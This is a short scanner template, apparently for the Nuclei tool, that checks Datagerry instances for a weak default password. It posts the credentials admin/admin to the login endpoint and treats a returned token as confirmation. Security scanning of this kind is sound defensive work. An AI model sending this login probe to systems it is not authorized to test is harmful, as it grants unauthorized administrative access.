id: poc-yaml-datagerry-weak-password
info:
  name: Datagerry Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password,datagerry
http:
  - method: POST
    path:
      - "{{BaseURL}}/rest/auth/login"
    headers:
      Content-Type: application/json
    body: |
      {"user_name":"admin","password":"admin"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"token\":"
          - "\"token_issued_at\":"
          - "\"token_expire\":"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: word
        part: header
        words:
          - "application/json"
